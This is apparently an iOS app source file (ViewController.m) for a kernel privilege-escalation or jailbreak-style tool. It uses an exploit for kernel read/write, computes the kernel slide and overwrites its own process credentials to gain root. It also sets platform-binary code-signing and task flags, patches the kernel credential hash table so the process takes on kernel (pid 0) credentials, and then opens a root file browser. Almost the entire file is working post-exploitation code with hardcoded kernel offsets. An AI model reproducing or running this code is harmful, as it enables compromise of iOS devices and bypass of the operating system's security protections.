#import "ViewController.h"

#include "exploit/exploit.h"
#include "exploit/kernel_rw.h"
#include "kstruct.h"
#include "patchfinder64.h"
#include "kerneldec.h"

#include <pthread.h>
#include <sys/socket.h>
#include <netdb.h>
#include <spawn.h>
#include <sys/utsname.h>

#import <CoreLocation/CoreLocation.h>

#import "AXNavigationController.h"
#import "AXFileViewController.h"
#import "AXLocationBackgrounder.h"

extern int csops(int, int, int*, int);

const uint64_t kernel_base_addr = 0xFFFFFFF007004000;
const uint64_t hardcode_off_allproc = 0xfffffff00a3a1aa0;
const uint64_t off_proc_ucred = 0xd8;
const uint64_t off_proc_csflags = 0x300;
const uint64_t off_proc_task = 0x10;
const uint64_t off_task_tflags = 0x40c;
const uint64_t off_task_bsdinfo = 0x3b8;
const uint64_t off_task_itkspace = 0x330; //?

uint64_t g_our_proc = 0;
uint64_t kernel_slide = 0;
uint64_t off_allproc = 0;
uint64_t off_kauth_cred_table_anchor = 0;

gid_t* saved_gid = NULL;
gid_t saved_gid_count = 0;
struct posix_cred saved_cred = {0};

uint64_t proc_of_pid(pid_t pid);


void saveMobileCred(uint64_t proc){
    
    uint64_t self_ucred = kread_ptr(proc + off_proc_ucred);
    uint64_t cr_posix_p = self_ucred + 0x18;
    
    kreadbuf(cr_posix_p, &saved_cred, sizeof(struct posix_cred));
    
    return;
    
}

uid_t restoreCred(uint64_t proc){
    
    uint64_t self_ucred = kread_ptr(proc + off_proc_ucred);
    uint64_t cr_posix_p = self_ucred + 0x18;
    
    kwritebuf(cr_posix_p, &saved_cred, sizeof(struct posix_cred));
    
    //CS_PLATFORM_BINARY
    uint32_t current_csflags = kread32(proc + off_proc_csflags);
    printf("p_csflags = %x\n", current_csflags);
    current_csflags &= ~0x14000000;
    kwrite32(proc + off_proc_csflags, current_csflags);
    
    //TF_PLATFORM
    uint64_t task = kread_ptr(proc + 0x10);
    uint32_t current_tflags = kread32(task + off_task_tflags);
    printf("tflags = %x\n", current_tflags);
    current_tflags &= ~0x00000400;
    kwrite64(task + off_task_tflags, current_tflags);
    
    return getuid();
    
}

//this function by @xina520
uid_t getRoot(uint64_t proc){
    
    uint64_t self_ucred = kread_ptr(proc + off_proc_ucred);
    uint64_t cr_posix_p = self_ucred + 0x18;
    
    kwrite64(cr_posix_p+0, 0);
    kwrite64(cr_posix_p+8, 0);
    kwrite64(cr_posix_p+16, 0);
    kwrite64(cr_posix_p+24, 0);
    kwrite64(cr_posix_p+32, 0);
    kwrite64(cr_posix_p+40, 0);
    kwrite64(cr_posix_p+48, 0);
    kwrite64(cr_posix_p+56, 0);
    kwrite64(cr_posix_p+64, 0);
    kwrite64(cr_posix_p+72, 0);
    kwrite64(cr_posix_p+80, 0);
    kwrite64(cr_posix_p+88, 0);
    
    setgroups(0, 0);
    
    //CS_PLATFORM_BINARY
    uint32_t current_csflags = kread32(proc + off_proc_csflags);
    printf("p_csflags = %x\n", current_csflags);
    current_csflags |= 0x14000000;
    kwrite32(proc + off_proc_csflags, current_csflags);
    
    //TF_PLATFORM
    uint64_t task = kread_ptr(proc + 0x10);
    uint32_t current_tflags = kread32(task + off_task_tflags);
    printf("tflags = %x\n", current_tflags);
    current_tflags |= 0x00000400;
    kwrite64(task + off_task_tflags, current_tflags);
    
    
    return getuid();
    
}

void getRootThisProc(void){
    
    getRoot(g_our_proc);
    
}

void noRoot(void){
    
    setgroups(saved_gid_count, saved_gid);
    restoreCred(g_our_proc);
    
}

//this function by @xina520
uint64_t kauth_cred_get_bucket(uint64_t a1){
    
    uint v1;
    uint64_t i;
    uint v3;
    uint v4;
    uint v5;
    uint v6;
    uint v7;
    uint v8;
    uint v9;
    uint v10;
    uint v11;
    uint v12;
    uint v13;
    uint v14;
    uint v15;
    uint v16;
    uint v17;
    int v18;
    
    v1 = 0;
    for(int i = 0x18; i != 0x78; ++i){
        v1 = (0x401 * (v1 + *(uint8_t*)(a1 + i))) ^ ((0x401 * (v1 + *(uint8_t*)(a1 + i))) >> 6);
    }
    
    v3 = 0x401 * (v1 + *(uint8_t*)(a1 + 0x80));
    v4 = 0x401 * ((v3 ^ (v3 >> 6)) + *(uint8_t*)(a1 + 0x81));
    v5 = 0x401 * ((v4 ^ (v4 >> 6)) + *(uint8_t*)(a1 + 0x82));
    v6 = 0x401 * ((v5 ^ (v5 >> 6)) + *(uint8_t*)(a1 + 0x83));
    v7 = 0x401 * ((v6 ^ (v6 >> 6)) + *(uint8_t*)(a1 + 0x84));
    v8 = 0x401 * ((v7 ^ (v7 >> 6)) + *(uint8_t*)(a1 + 0x85));
    v9 = 0x401 * ((v8 ^ (v8 >> 6)) + *(uint8_t*)(a1 + 0x86));
    v10 = 0x401 * ((v9 ^ (v9 >> 6)) + *(uint8_t*)(a1 + 0x87));
    v11 = 0x401 * ((v10 ^ (v10 >> 6)) + *(uint8_t*)(a1 + 0x88));
    v12 = 0x401 * ((v11 ^ (v11 >> 6)) + *(uint8_t*)(a1 + 0x89));
    v13 = 0x401 * ((v12 ^ (v12 >> 6)) + *(uint8_t*)(a1 + 0x8a));
    v14 = 0x401 * ((v13 ^ (v13 >> 6)) + *(uint8_t*)(a1 + 0x8b));
    v15 = 0x401 * ((v14 ^ (v14 >> 6)) + *(uint8_t*)(a1 + 0x8c));
    v16 = 0x401 * ((v15 ^ (v15 >> 6)) + *(uint8_t*)(a1 + 0x8d));
    v17 = 0x401 * ((v16 ^ (v16 >> 6)) + *(uint8_t*)(a1 + 0x8e));

    v18 = (1025 * ((v17 ^ (v17 >> 6)) + *(uint8_t*)(a1 + 0x8f))) ^ ((1025 * ((v17 ^ (v17 >> 6)) + *(uint8_t*)(a1 + 0x8f))) >> 6);
    
    uint64_t kauth_cred_table_anchor = off_kauth_cred_table_anchor + kernel_slide;
    return kauth_cred_table_anchor + 8 * (((9 * v18) ^ ((unsigned int)(9 * v18) >> 11)) & 0x7F);
    
    
}

//this function by @xina520
void copy_proc_ucred(uint64_t other_ucred){
    
    uint64_t k_ucred = kread_ptr(proc_of_pid(getpid()) + off_proc_ucred);
    struct ucred key = {0};
    kreadbuf(k_ucred + 0x18, &key.cr_posix, sizeof(struct posix_cred));
    kreadbuf(k_ucred + 0x80, &key.cr_audit, sizeof(struct au_session));
    key.cr_posix.cr_ngroups = 3;
    
    printf("cr_posixsize = %d\n", sizeof(struct posix_cred));
    printf("auditsize = %d\n", sizeof(struct au_session));
    
    uint64_t link = kauth_cred_get_bucket((uint64_t)&key);
    printf("link addr = 0x%llx\n", link);
    uint64_t findlink = 0;
    while (true) {
        findlink = link;
        link = kread_ptr(link);
        if (link == 0xffffff8000000000) break;
        uint64_t k_label = kread_ptr(link + 0x78);
        //printf("link = 0x%llx\nlabel = 0x%llx\n", link, k_label);
        if (!k_label) break;
    }
    
    printf("findlink = 0x%llx\n", findlink);
    
    sleep(1);
    
    uint64_t kernel_cr_posix_p = other_ucred + 0x18;
    struct ucred kernel_cred_label = {0};
    kreadbuf(kernel_cr_posix_p, &kernel_cred_label.cr_posix, sizeof(struct posix_cred));
    
    unsigned kernel_cr_ngroups = kernel_cred_label.cr_posix.cr_ngroups;
    int kernel_cr_flags = kernel_cred_label.cr_posix.cr_flags;
    printf("cr_ngroups = %d\n", kernel_cr_ngroups);
    printf("cr_flags = %d\n", kernel_cr_flags);
    kernel_cred_label.cr_posix.cr_ngroups = 3;
    kernel_cred_label.cr_posix.cr_flags = 1;
    
    kwritebuf(kernel_cr_posix_p, &kernel_cred_label.cr_posix, sizeof(struct posix_cred));
    
    kwrite64(findlink, other_ucred);
    
    struct posix_cred zero_cred = {0};
    setgroups(3, &zero_cred.cr_groups);
    k_ucred = kread_ptr(proc_of_pid(getpid()) + off_proc_ucred);
    kwrite32(k_ucred+0x74, 3);
    
    kernel_cred_label.cr_posix.cr_ngroups = kernel_cr_ngroups;
    kernel_cred_label.cr_posix.cr_flags = kernel_cr_flags;
    
    kwritebuf(kernel_cr_posix_p, &kernel_cred_label.cr_posix, sizeof(struct posix_cred));
    
}


uint64_t proc_of_pid(pid_t pid) {
    uint64_t proc = kread_ptr(hardcode_off_allproc + kernel_slide);
    uint64_t pd = 0;
    while (proc) {
        pd = kread32(proc + 0x68);
        if (pd == pid) return proc;
        proc = kread_ptr(proc);
    }
    return 0;
}


static int go(void)
{
    uint64_t kernel_base = 0;
    
    if (exploit_get_krw_and_kernel_base(&kernel_base) != 0)
    {
        printf("Exploit failed!\n");
        return 1;
    }
    
    // test kernel r/w, read kernel base
    uint32_t mh_magic = kread32(kernel_base);
    if (mh_magic != 0xFEEDFACF)
    {
        printf("mh_magic != 0xFEEDFACF: %08X\n", mh_magic);
        return 1;
    }
    
    printf("kread32(_kernel_base) success: %08X\n", mh_magic);
    
    kernel_slide = kernel_base - kernel_base_addr;
    
    printf("slide = 0x%llx\n", kernel_slide);
    
    //--------------------------------------
    //need get our_proc without hardcoded offset
    //
    //--------------------------------------
    
    uint64_t our_proc = proc_of_pid(getpid());
    
    g_our_proc = our_proc;
    
    printf("our proc is 0x%llx\n", our_proc);
    
    saved_gid = NULL;
    saved_gid_count = getgroups(0, saved_gid);
    
    saved_gid = malloc(saved_gid_count * sizeof(gid_t));
    
    getgroups(saved_gid_count, saved_gid);
    
    printf("savedgidcount = %d\n", saved_gid_count);
    
    sleep(1);
    
    saveMobileCred(our_proc);
    
    getRoot(our_proc);
    
    //copy_proc_ucred(kread_ptr(proc_of_pid(0) + off_proc_ucred));
    
    int rv;
    uint64_t base = 0;
    NSError* error = nil;
    
    NSString* prebootPath = @"/private/preboot/active";
    
    NSString* activeFolderName = [NSString stringWithContentsOfFile:prebootPath];
    
    NSString* kernelPath = [NSString stringWithFormat:@"/private/preboot/%@/System/Library/Caches/com.apple.kernelcaches/kernelcache", activeFolderName];
    
    NSString* workspaceKernelPath = @"/tmp/kernel.tmp";
    
    [[NSFileManager defaultManager] copyItemAtPath:kernelPath toPath:workspaceKernelPath error:&error];
    
    if(error){
        printf("Failed copy");
        exit(1);
    }
    
    FILE* file_input = fopen([workspaceKernelPath UTF8String], "rb");
    FILE* file_output = fopen("/tmp/kernel.dec.tmp", "wb");
    
    if(file_output == NULL || file_input == NULL){
        printf("Failed open /tmp/kernel.tmp");
        exit(1);
    }
    
    decompress_kernel(file_input, file_output, NULL, true);
    
    fclose(file_input);
    fclose(file_output);
    
    rv = init_kernel(base, "/tmp/kernel.dec.tmp");
    assert(rv == 0);
    
    unlink("/tmp/kernel.tmp");
    unlink("/tmp/kernel.dec.tmp");
    
    off_allproc = find_allproc();
    off_kauth_cred_table_anchor = find_kauth_cred_table_anchor();
    
    printf("all_proc : 0x%llx\n", off_allproc);
    printf("kauth_cred_table_anchor : 0x%llx\n", off_kauth_cred_table_anchor);

    term_kernel();
    
    if(off_allproc != 0 && off_kauth_cred_table_anchor != 0){
        printf("failed find offset\n");
        return 0;
    }
    
    copy_proc_ucred(kread_ptr(proc_of_pid(0) + off_proc_ucred));
    
    //cleanup
    //exploitation_cleanup();
    //noRoot();
    
    printf("Done\n");
    
    return 0;
}


@interface ViewController ()

@end

@implementation ViewController

- (void)viewDidLoad {
    
    [super viewDidLoad];
    
}

-(void)viewDidAppear:(BOOL)animated{
    
    [AXLocationBackgrounder startBackgrounder];
    
    sleep(1);
    
    pthread_t pt;
    pthread_create(&pt, NULL, (void *(*)(void *))go, NULL);
    pthread_join(pt, NULL);
    sleep(1);
    
    AXFileViewController* fv = [[AXFileViewController alloc] initWithPath:@"/"];
    AXNavigationController* vc = [[AXNavigationController alloc] initWithRootViewController:fv];
    vc.modalPresentationStyle = UIModalPresentationFullScreen;
    [self presentViewController:vc animated:YES completion:nil];
    
}

@end
